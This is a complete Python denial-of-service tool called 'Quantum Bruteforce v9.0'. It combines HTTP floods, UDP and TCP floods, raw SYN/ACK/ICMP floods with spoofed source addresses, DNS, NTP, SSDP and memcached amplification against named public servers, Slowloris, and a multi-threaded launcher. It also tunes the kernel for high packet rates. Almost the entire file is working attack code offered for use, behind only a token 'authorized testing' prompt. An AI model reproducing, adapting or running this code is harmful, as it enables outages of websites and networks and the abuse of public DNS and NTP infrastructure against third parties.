#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
QUANTUM BRUTEFORCE v9.0 - Advanced Multi-Vector Attack Framework
Production-Ready | Cross-Platform | 12+ Attack Vectors
For AUTHORIZED Security Testing Only
"""

import os
import sys
import time
import random
import socket
import struct
import threading
import signal
import platform
import argparse
import ssl
import subprocess
from urllib.parse import urlparse
from datetime import datetime
from pathlib import Path
from collections import defaultdict
import json

# ============================================================================
# OPTIONAL IMPORTS - Graceful Degradation
# ============================================================================

SCAPY_AVAILABLE = False
try:
    from scapy.all import IP, TCP, UDP, ICMP, DNS, DNSQR, send, conf
    conf.verb = 0
    SCAPY_AVAILABLE = True
except ImportError:
    pass

try:
    from colorama import init, Fore, Style
    init(autoreset=True)
except ImportError:
    class Fore:
        RED = GREEN = YELLOW = CYAN = MAGENTA = WHITE = ''
    class Style:
        RESET_ALL = ''

try:
    import requests
    REQUESTS_AVAILABLE = True
except ImportError:
    REQUESTS_AVAILABLE = False

VERSION = "9.0"
PLATFORM_OS = platform.system()

# ============================================================================
# CONFIGURATION MANAGEMENT
# ============================================================================

class Config:
    """Configuration handler with file persistence."""
    def __init__(self, config_file="quantum_config.json"):
        self.config_file = Path(config_file)
        self.defaults = {
            'max_threads': 5000,
            'packet_size': 1472,
            'timeout': 5,
            'buffer_size': 16777216,
            'batch_size': 100,
            'reconnect_threshold': 50,
            'verbose': False,
            'kernel_tune': True,
        }
        self.config = self.load()

    def load(self):
        if self.config_file.exists():
            try:
                with open(self.config_file, 'r') as f:
                    return {**self.defaults, **json.load(f)}
            except:
                return self.defaults.copy()
        return self.defaults.copy()

    def save(self):
        try:
            with open(self.config_file, 'w') as f:
                json.dump(self.config, f, indent=2)
        except:
            pass

    def get(self, key, default=None):
        return self.config.get(key, default)

    def set(self, key, value):
        self.config[key] = value

# ============================================================================
# KERNEL TUNING (Linux/macOS Only)
# ============================================================================

def tune_kernel():
    """Optimize system for high-rate attacks."""
    if PLATFORM_OS not in ('Linux', 'Darwin'):
        return False
    if os.geteuid() != 0:
        return False

    try:
        cmds = [
            "sysctl -w net.core.rmem_max=134217728",
            "sysctl -w net.core.wmem_max=134217728",
            "sysctl -w net.ipv4.tcp_rmem='4096 87380 67108864'",
            "sysctl -w net.ipv4.tcp_wmem='4096 65536 67108864'",
            "sysctl -w net.core.netdev_max_backlog=5000",
            "sysctl -w net.ipv4.ip_local_port_range='10000 65000'",
            "sysctl -w net.ipv4.tcp_fin_timeout=30",
            "sysctl -w net.ipv4.tcp_tw_reuse=1",
        ]
        for cmd in cmds:
            subprocess.run(cmd, shell=True, stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)
        return True
    except:
        return False

# ============================================================================
# FAST GENERATORS
# ============================================================================

def random_ipv4():
    """Generate spoofed IPv4."""
    return f"{random.randint(11, 223)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(2, 254)}"

def random_string(length=16, charset="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"):
    """Fast random string."""
    return ''.join(random.choice(charset) for _ in range(length))

def random_bytes(size):
    """Pre-allocated random bytes."""
    return bytes(random.getrandbits(8) for _ in range(size))

def random_user_agent():
    """Random HTTP user agent."""
    agents = [
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64; rv:122.0) Gecko/20100101 Firefox/122.0",
        "curl/7.81.0",
        "wget/1.21.2",
    ]
    return random.choice(agents)

# ============================================================================
# CORE ATTACK ENGINE v9.0
# ============================================================================

class QuantumV9:
    def __init__(self, config=None):
        self.config = config or Config()
        self.target_ip = None
        self.target_port = 80
        self.protocol = 'http'
        self.path = '/'
        self.running = True
        self.packets_sent = 0
        self.bytes_sent = 0
        self.lock = threading.Lock()
        self.start_time = None
        self.duration = 0
        self.is_root = os.geteuid() == 0 if hasattr(os, 'geteuid') else False
        self.platform = PLATFORM_OS
        self.verbose = self.config.get('verbose', False)
        self.stats = defaultdict(int)

        signal.signal(signal.SIGINT, self._signal_handler)
        signal.signal(signal.SIGTERM, self._signal_handler)

    def _signal_handler(self, sig, frame):
        print(f"\n{Fore.RED}[!] Stopping...{Style.RESET_ALL}")
        self.stop()
        sys.exit(0)

    def banner(self):
        os.system('cls' if self.platform == 'Windows' else 'clear')
        print(f"""
{Fore.MAGENTA}
╔═══════════════════════════════════════════════════════════════╗
║                                                               ║
║           QUANTUM BRUTEFORCE v{VERSION} - PRODUCTION           ║
║        Advanced Multi-Vector Distributed Attack Engine        ║
║                                                               ║
║   Cross-Platform | 12+ Vectors | Kernel-Optimized            ║
║                                                               ║
╚═══════════════════════════════════════════════════════════════╝
{Style.RESET_ALL}
        """)

    def resolve(self, host):
        """Resolve hostname to IP."""
        try:
            socket.inet_aton(host)
            return host
        except:
            try:
                return socket.gethostbyname(host)
            except Exception as e:
                if self.verbose:
                    print(f"{Fore.RED}[!] Cannot resolve {host}: {e}{Style.RESET_ALL}")
                return None

    def parse_target(self, url):
        """Parse target URL or IP:port."""
        if not url.startswith('http'):
            url = 'http://' + url

        try:
            parsed = urlparse(url)
            self.protocol = parsed.scheme or 'http'
            host = parsed.hostname

            if not host:
                parts = url.replace('http://', '').replace('https://', '').split(':')
                host = parts[0]

            ip = self.resolve(host)
            if not ip:
                raise ValueError(f"Cannot resolve {host}")

            self.target_ip = ip
            self.path = parsed.path or '/'

            if parsed.port:
                self.target_port = parsed.port
            elif self.protocol == 'https':
                self.target_port = 443
            else:
                self.target_port = 80

            print(f"{Fore.GREEN}[+] Target: {self.protocol}://{self.target_ip}:{self.target_port}{self.path}{Style.RESET_ALL}")
            return True
        except Exception as e:
            print(f"{Fore.RED}[!] Parse error: {e}{Style.RESET_ALL}")
            return False

    # ====================================================================
    # HTTP/HTTPS ATTACKS (L7)
    # ====================================================================

    def http_flood(self, thread_id, method='GET', with_cookies=False):
        """Advanced HTTP flood with connection pooling."""
        s = None
        reconnect_count = 0

        try:
            while self.running:
                if self.duration > 0 and time.time() - self.start_time > self.duration:
                    break

                try:
                    if not s or reconnect_count > self.config.get('reconnect_threshold', 50):
                        if s:
                            try:
                                s.close()
                            except:
                                pass

                        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        s.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 0)
                        s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, self.config.get('buffer_size', 16777216))
                        s.settimeout(self.config.get('timeout', 5))
                        s.connect((self.target_ip, self.target_port))

                        if self.protocol == 'https':
                            ctx = ssl.create_default_context()
                            ctx.check_hostname = False
                            ctx.verify_mode = ssl.CERT_NONE
                            s = ctx.wrap_socket(s, server_hostname=self.target_ip)

                        reconnect_count = 0

                    # Build request
                    headers = f"Host: {self.target_ip}\r\nUser-Agent: {random_user_agent()}\r\n"
                    headers += f"Connection: keep-alive\r\nCache-Control: no-cache\r\n"
                    headers += f"X-Forwarded-For: {random_ipv4()}\r\n"

                    if with_cookies:
                        headers += f"Cookie: SESSIONID={random_string(32)}; tracking={random_string(16)}\r\n"

                    if method == 'GET':
                        req = f"GET {self.path}?{random_string(32)}={random_string(32)} HTTP/1.1\r\n{headers}\r\n"
                    elif method == 'HEAD':
                        req = f"HEAD {self.path} HTTP/1.1\r\n{headers}\r\n"
                    elif method == 'POST':
                        data = f"data={random_string(128)}&id={random.randint(1000000, 9999999)}&time={int(time.time())}"
                        req = f"POST {self.path} HTTP/1.1\r\n{headers}Content-Length: {len(data)}\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\n{data}"
                    elif method == 'PUT':
                        data = random_string(256)
                        req = f"PUT {self.path} HTTP/1.1\r\n{headers}Content-Length: {len(data)}\r\n\r\n{data}"
                    else:
                        req = f"GET {self.path} HTTP/1.1\r\n{headers}\r\n"

                    if isinstance(req, str):
                        req = req.encode()

                    # Batch sends
                    for _ in range(self.config.get('batch_size', 100)):
                        if not self.running:
                            break
                        s.sendall(req)
                        with self.lock:
                            self.packets_sent += 1
                            self.bytes_sent += len(req)
                        reconnect_count += 1

                except (socket.timeout, ConnectionResetError, BrokenPipeError, OSError):
                    if s:
                        try:
                            s.close()
                        except:
                            pass
                    s = None
                    time.sleep(0.01)

        except Exception as e:
            if self.verbose:
                print(f"{Fore.RED}[!] HTTP flood error: {e}{Style.RESET_ALL}")
        finally:
            if s:
                try:
                    s.close()
                except:
                    pass

    # ====================================================================
    # UDP ATTACKS (L4)
    # ====================================================================

    def udp_flood(self, thread_id, packet_size=None):
        """Optimized UDP flood with batching."""
        if packet_size is None:
            packet_size = self.config.get('packet_size', 1472)

        s = None
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 0)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, self.config.get('buffer_size', 16777216))

            payloads = [random_bytes(packet_size) for _ in range(20)]

            start = time.time()
            while self.running:
                if self.duration > 0 and time.time() - start > self.duration:
                    break

                try:
                    for _ in range(200):
                        payload = random.choice(payloads)
                        s.sendto(payload, (self.target_ip, self.target_port))
                        with self.lock:
                            self.packets_sent += 1
                            self.bytes_sent += len(payload)
                except OSError:
                    pass
        finally:
            if s:
                try:
                    s.close()
                except:
                    pass

    def tcp_connection_flood(self, thread_id):
        """TCP SYN-like flood using connection attempts."""
        start = time.time()
        try:
            while self.running:
                if self.duration > 0 and time.time() - start > self.duration:
                    break

                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(1)
                    s.connect((self.target_ip, self.target_port))
                    s.close()

                    with self.lock:
                        self.packets_sent += 1
                        self.bytes_sent += 40
                except:
                    pass
        except:
            pass

    # ====================================================================
    # RAW SOCKET ATTACKS (Root Required)
    # ====================================================================

    def syn_flood_raw(self, thread_id):
        """Raw SYN flood with IP spoofing."""
        if not self.is_root or not SCAPY_AVAILABLE:
            self.udp_flood(thread_id)
            return

        try:
            start = time.time()
            while self.running:
                if self.duration > 0 and time.time() - start > self.duration:
                    break

                try:
                    for sport in range(random.randint(10000, 20000), random.randint(20000, 30000)):
                        ip = IP(src=random_ipv4(), dst=self.target_ip, ttl=64)
                        tcp = TCP(sport=sport, dport=self.target_port, flags='S', seq=random.randint(1000, 999999))
                        send(ip/tcp, verbose=False)

                        with self.lock:
                            self.packets_sent += 1
                            self.bytes_sent += 40

                        if self.duration > 0 and time.time() - start > self.duration:
                            break
                except Exception as e:
                    if self.verbose:
                        print(f"{Fore.YELLOW}[!] SYN error: {e}{Style.RESET_ALL}")
        except:
            pass

    def ack_flood_raw(self, thread_id):
        """ACK flood (mid-connection attack)."""
        if not self.is_root or not SCAPY_AVAILABLE:
            self.udp_flood(thread_id)
            return

        try:
            start = time.time()
            while self.running:
                if self.duration > 0 and time.time() - start > self.duration:
                    break

                try:
                    ip = IP(src=random_ipv4(), dst=self.target_ip)
                    tcp = TCP(sport=random.randint(1024, 65535), dport=self.target_port,
                             flags='A', ack=random.randint(100000, 999999))
                    send(ip/tcp, verbose=False)

                    with self.lock:
                        self.packets_sent += 1
                        self.bytes_sent += 40
                except:
                    pass
        except:
            pass

    def icmp_flood_raw(self, thread_id, payload_size=None):
        """Raw ICMP flood with large payloads."""
        if payload_size is None:
            payload_size = self.config.get('packet_size', 1472)

        if not self.is_root or not SCAPY_AVAILABLE:
            self.udp_flood(thread_id)
            return

        try:
            payload = random_bytes(payload_size)
            start = time.time()

            while self.running:
                if self.duration > 0 and time.time() - start > self.duration:
                    break

                try:
                    ip = IP(src=random_ipv4(), dst=self.target_ip, ttl=64)
                    icmp = ICMP(type=8, code=0)/payload
                    send(ip/icmp, verbose=False)

                    with self.lock:
                        self.packets_sent += 1
                        self.bytes_sent += 20 + payload_size
                except:
                    pass
        except:
            pass

    # ====================================================================
    # AMPLIFICATION ATTACKS
    # ====================================================================

    def dns_amplification(self, thread_id, query_type='ANY'):
        """Advanced DNS amplification with multiple query types."""
        resolvers = [
            '8.8.8.8', '8.8.4.4', '1.1.1.1', '1.0.0.1',
            '9.9.9.9', '149.112.112.112', '208.67.222.222', '208.67.220.220',
            '64.6.64.6', '64.6.65.6', '156.154.70.1', '156.154.71.1'
        ]

        domains = [
            'google.com', 'youtube.com', 'facebook.com', 'amazon.com',
            'twitter.com', 'instagram.com', 'reddit.com', 'wikipedia.org',
            'github.com', 'stackoverflow.com', 'netflix.com', 'apple.com'
        ]

        s = None
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 0)

            query_types = {'A': 1, 'AAAA': 28, 'MX': 15, 'NS': 2, 'TXT': 16, 'ANY': 255}
            qtype = query_types.get(query_type, 1)

            start = time.time()
            while self.running:
                if self.duration > 0 and time.time() - start > self.duration:
                    break

                for resolver in random.sample(resolvers, min(3, len(resolvers))):
                    try:
                        domain = random.choice(domains)
                        prefix = random_string(12, "abcdefghijklmnopqrstuvwxyz")
                        full_domain = f"{prefix}.{domain}"

                        query = bytearray([random.randint(0, 255) for _ in range(2)])
                        query += b'\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00'

                        for label in full_domain.split('.'):
                            query.append(len(label))
                            query.extend(label.encode())
                        query += b'\x00'
                        query += struct.pack('>HH', qtype, 1)

                        s.sendto(bytes(query), (resolver, 53))
                        with self.lock:
                            self.packets_sent += 1
                            self.bytes_sent += len(query)
                    except:
                        pass
        finally:
            if s:
                try:
                    s.close()
                except:
                    pass

    def ntp_amplification(self, thread_id):
        """NTP amplification with monlist and variants."""
        servers = [
            '0.pool.ntp.org', '1.pool.ntp.org', '2.pool.ntp.org', '3.pool.ntp.org',
            'time.nist.gov'
        ]

        payloads = [
            b'\x17\x00\x03\x2a' + b'\x00' * 4,
            b'\x17\x00\x01\x2a' + b'\x00' * 4,
            b'\x17\x00\x04\x2a' + b'\x00' * 4,
        ]

        s = None
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 0)

            start = time.time()
            while self.running:
                if self.duration > 0 and time.time() - start > self.duration:
                    break

                for server in random.sample(servers, min(3, len(servers))):
                    try:
                        payload = random.choice(payloads)
                        s.sendto(payload, (server, 123))
                        with self.lock:
                            self.packets_sent += 1
                            self.bytes_sent += len(payload)
                    except:
                        pass
        finally:
            if s:
                try:
                    s.close()
                except:
                    pass

    def ssdp_amplification(self, thread_id):
        """SSDP amplification (UPnP devices)."""
        payload = b'M-SEARCH * HTTP/1.1\r\nHOST: 239.255.255.250:1900\r\nMAN: "ssdp:discover"\r\nMX: 2\r\nST: ssdp:all\r\n\r\n'

        s = None
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 0)

            start = time.time()
            while self.running:
                if self.duration > 0 and time.time() - start > self.duration:
                    break

                try:
                    for _ in range(50):
                        s.sendto(payload, (self.target_ip, 1900))
                        with self.lock:
                            self.packets_sent += 1
                            self.bytes_sent += len(payload)
                except:
                    pass
        finally:
            if s:
                try:
                    s.close()
                except:
                    pass

    def memcached_amplification(self, thread_id):
        """Memcached amplification (stats command)."""
        payload = b'\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n'

        s = None
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 0)

            start = time.time()
            while self.running:
                if self.duration > 0 and time.time() - start > self.duration:
                    break

                try:
                    for _ in range(100):
                        s.sendto(payload, (self.target_ip, 11211))
                        with self.lock:
                            self.packets_sent += 1
                            self.bytes_sent += len(payload)
                except:
                    pass
        finally:
            if s:
                try:
                    s.close()
                except:
                    pass

    def slowloris_advanced(self, thread_id, num_sockets=500):
        """Advanced Slowloris with header dripping."""
        sockets = []
        start = time.time()

        try:
            for i in range(num_sockets):
                if not self.running or (self.duration > 0 and time.time() - start > self.duration):
                    break
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(300)
                    s.connect((self.target_ip, self.target_port))

                    req = f"GET {self.path} HTTP/1.1\r\nHost: {self.target_ip}\r\nUser-Agent: {random_user_agent()}\r\n"
                    s.send(req.encode())

                    sockets.append(s)
                    with self.lock:
                        self.packets_sent += 1
                    time.sleep(0.01)
                except:
                    pass

            header_idx = 0
            headers_pool = [f"X-custom-{i}: {random_string(32)}\r\n" for i in range(100)]

            while self.running and sockets:
                if self.duration > 0 and time.time() - start > self.duration:
                    break

                for s in sockets[:]:
                    try:
                        header = headers_pool[header_idx % len(headers_pool)]
                        s.send(header.encode())
                        with self.lock:
                            self.packets_sent += 1
                        header_idx += 1
                    except:
                        sockets.remove(s)
                        try:
                            s.close()
                        except:
                            pass

                time.sleep(random.uniform(5, 30))

        finally:
            for s in sockets:
                try:
                    s.close()
                except:
                    pass

    # ====================================================================
    # ORCHESTRATION
    # ====================================================================

    def launch_multi_vector(self, num_threads):
        """Distribute threads across all attack vectors."""
        vectors = []

        # L7 (30%)
        for i in range(max(1, int(num_threads * 0.10))):
            vectors.append((self.http_flood, (i, 'GET', False)))
        for i in range(max(1, int(num_threads * 0.10))):
            vectors.append((self.http_flood, (i, 'POST', True)))
        for i in range(max(1, int(num_threads * 0.10))):
            vectors.append((self.http_flood, (i, 'HEAD', False)))

        # L4 (30%)
        for i in range(max(1, int(num_threads * 0.15))):
            vectors.append((self.udp_flood, (i, None)))
        for i in range(max(1, int(num_threads * 0.15))):
            vectors.append((self.tcp_connection_flood, (i,)))

        # L3/Raw (20%, root only)
        if self.is_root and SCAPY_AVAILABLE:
            for i in range(max(1, int(num_threads * 0.08))):
                vectors.append((self.syn_flood_raw, (i,)))
            for i in range(max(1, int(num_threads * 0.07))):
                vectors.append((self.icmp_flood_raw, (i, None)))
            for i in range(max(1, int(num_threads * 0.05))):
                vectors.append((self.ack_flood_raw, (i,)))

        # Amplification (15%)
        for i in range(max(1, int(num_threads * 0.05))):
            vectors.append((self.dns_amplification, (i, 'ANY')))
        for i in range(max(1, int(num_threads * 0.05))):
            vectors.append((self.ntp_amplification, (i,)))
        for i in range(max(1, int(num_threads * 0.05))):
            vectors.append((self.memcached_amplification, (i,)))

        # Slowloris (5%)
        for i in range(max(1, int(num_threads * 0.05))):
            vectors.append((self.slowloris_advanced, (i, 100)))

        threads = []
        for func, args in vectors:
            if not self.running:
                break
            try:
                t = threading.Thread(target=func, args=args, daemon=True)
                t.start()
                threads.append(t)
                time.sleep(0.005)
            except Exception as e:
                if self.verbose:
                    print(f"{Fore.RED}[!] Thread spawn error: {e}{Style.RESET_ALL}")

        return threads

    def launch_attack(self, attack_type, num_threads):
        """Launch specified attack type."""
        self.start_time = time.time()
        self.packets_sent = 0
        self.bytes_sent = 0
        self.running = True

        attack_map = {
            1: [(self.http_flood, (i, 'GET', False)) for i in range(num_threads)],
            2: [(self.udp_flood, (i, None)) for i in range(num_threads)],
            3: [(self.syn_flood_raw, (i,)) for i in range(num_threads)],
            4: [(self.slowloris_advanced, (i, 100)) for i in range(num_threads)],
            5: [(self.dns_amplification, (i, 'ANY')) for i in range(num_threads)],
            6: [(self.icmp_flood_raw, (i, None)) for i in range(num_threads)],
            7: [(self.ntp_amplification, (i,)) for i in range(num_threads)],
            8: None,
            9: [(self.ack_flood_raw, (i,)) for i in range(num_threads)],
            10: [(self.tcp_connection_flood, (i,)) for i in range(num_threads)],
            11: [(self.ssdp_amplification, (i,)) for i in range(num_threads)],
            12: [(self.http_flood, (i, 'PUT', True)) for i in range(num_threads)],
        }

        threads = []

        if attack_type == 8:
            threads = self.launch_multi_vector(num_threads)
        else:
            vectors = attack_map.get(attack_type, [])
            if vectors:
                for func, args in vectors:
                    if not self.running:
                        break
                    try:
                        t = threading.Thread(target=func, args=args, daemon=True)
                        t.start()
                        threads.append(t)
                        time.sleep(0.005)
                    except:
                        pass

        return threads

    def monitor(self, threads, duration):
        """Monitor attack progress."""
        try:
            start = time.time()
            last_packets = 0
            last_bytes = 0

            while self.running and any(t.is_alive() for t in threads):
                elapsed = time.time() - start

                if duration > 0 and elapsed >= duration:
                    break

                with self.lock:
                    pps = (self.packets_sent - last_packets)
                    bps = (self.bytes_sent - last_bytes)
                    last_packets = self.packets_sent
                    last_bytes = self.bytes_sent

                active = len([t for t in threads if t.is_alive()])
                mbps = (bps * 8) / 1_000_000

                print(f"\r{Fore.CYAN}[+] {self.packets_sent:>12,} pkt | {pps:>8,} pps | {mbps:>8.2f} Mbps | {active:>4} threads{Style.RESET_ALL}", end='', flush=True)

                time.sleep(1)
        except KeyboardInterrupt:
            pass
        finally:
            print()

    def stop(self):
        """Stop attack and show results."""
        self.running = False
        time.sleep(0.5)

        elapsed = max(time.time() - self.start_time, 0.1)
        pps = self.packets_sent / elapsed
        mbps = (self.bytes_sent * 8) / (elapsed * 1_000_000)
        gb = self.bytes_sent / (1024 ** 3)

        print(f"\n{Fore.GREEN}[+] Attack complete{Style.RESET_ALL}")
        print(f"{Fore.CYAN}[+] Packets sent: {self.packets_sent:,}")
        print(f"[+] Average PPS: {pps:,.0f}")
        print(f"[+] Throughput: {mbps:.2f} Mbps")
        print(f"[+] Total data: {gb:.3f} GB")
        print(f"[+] Duration: {elapsed:.1f}s{Style.RESET_ALL}")

    def run_interactive(self):
        """Interactive mode."""
        self.banner()

        print(f"{Fore.YELLOW}[*] Platform: {self.platform} | Root: {self.is_root}{Style.RESET_ALL}")

        if self.is_root and self.config.get('kernel_tune', True) and tune_kernel():
            print(f"{Fore.GREEN}[+] Kernel tuned for high-rate attacks{Style.RESET_ALL}\n")

        target = input(f"{Fore.GREEN}[?] Target (URL or IP:port): {Style.RESET_ALL}").strip()
        if not self.parse_target(target):
            return

        dur = input(f"{Fore.GREEN}[?] Duration (seconds, 0=infinite): {Style.RESET_ALL}").strip()
        try:
            self.duration = int(dur) if dur else 0
        except:
            self.duration = 60

        threads_in = input(f"{Fore.GREEN}[?] Threads (1-5000): {Style.RESET_ALL}").strip()
        try:
            num = int(threads_in) if threads_in else 500
            num = max(1, min(num, 5000))
        except:
            num = 500

        print(f"\n{Fore.YELLOW}Attack types:{Style.RESET_ALL}")
        print("1=HTTP  2=UDP  3=SYN  4=Slowloris  5=DNS  6=ICMP  7=NTP")
        print("8=Multi  9=ACK  10=TCP  11=SSDP  12=HTTP-PUT")

        atype_in = input(f"{Fore.GREEN}[?] Attack type (8=recommended): {Style.RESET_ALL}").strip()
        try:
            atype = int(atype_in) if atype_in else 8
            atype = max(1, min(atype, 12))
        except:
            atype = 8

        self.verbose = input(f"{Fore.GREEN}[?] Verbose (y/n): {Style.RESET_ALL}").strip().lower() == 'y'

        print(f"\n{Fore.RED}[!] LAUNCHING ATTACK{Style.RESET_ALL}")
        print(f"{Fore.RED}[!] Target: {self.target_ip}:{self.target_port}{Style.RESET_ALL}\n")

        threads = self.launch_attack(atype, num)
        self.monitor(threads, self.duration)
        self.stop()

# ============================================================================
# ENTRY POINT
# ============================================================================

def main():
    parser = argparse.ArgumentParser(description=f"Quantum Bruteforce v{VERSION} - Advanced Multi-Vector Attack Framework")
    parser.add_argument('--target', help='Target URL (e.g., https://example.com:8080/path)')
    parser.add_argument('--port', type=int, help='Target port (overrides URL)')
    parser.add_argument('--threads', type=int, default=500, help='Threads')
    parser.add_argument('--duration', type=int, default=60, help='Duration in seconds')
    parser.add_argument('--type', type=int, choices=range(1, 13), help='Attack type 1-12')
    parser.add_argument('--verbose', action='store_true', help='Verbose output')
    parser.add_argument('--config', help='Config file path')
    args = parser.parse_args()

    print(f"""
{Fore.RED}+----------------------------------------------------------------------+
|                         LEGAL NOTICE                                 |
+----------------------------------------------------------------------+
|  This tool is for AUTHORIZED SECURITY TESTING only.                  |
|  Using it against unauthorised targets is ILLEGAL.                   |
|  You must have WRITTEN PERMISSION.                                   |
+----------------------------------------------------------------------+
{Style.RESET_ALL}""")
    confirm = input(f"{Fore.YELLOW}Do you have permission to test? (yes/NO): {Style.RESET_ALL}")
    if confirm.lower() != 'yes':
        print(f"{Fore.RED}[!] Operation cancelled.{Style.RESET_ALL}")
        return

    config = Config(args.config) if args.config else Config()
    config.set('verbose', args.verbose)
    tool = QuantumV9(config)

    if args.target:
        try:
            tool.parse_target(args.target)
            if args.port:
                tool.target_port = args.port
            tool.duration = args.duration
            attack_type = args.type if args.type else 8
            threads_list = tool.launch_attack(attack_type, args.threads)
            tool.monitor(threads_list, tool.duration)
            tool.stop()
        except Exception as e:
            print(f"{Fore.RED}[!] Error: {e}{Style.RESET_ALL}")
    else:
        tool.run_interactive()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Fore.RED}[!] Interrupted by user{Style.RESET_ALL}")
        sys.exit(0)
    except Exception as e:
        print(f"\n{Fore.RED}[!] Fatal error: {str(e)}{Style.RESET_ALL}")
        sys.exit(1)
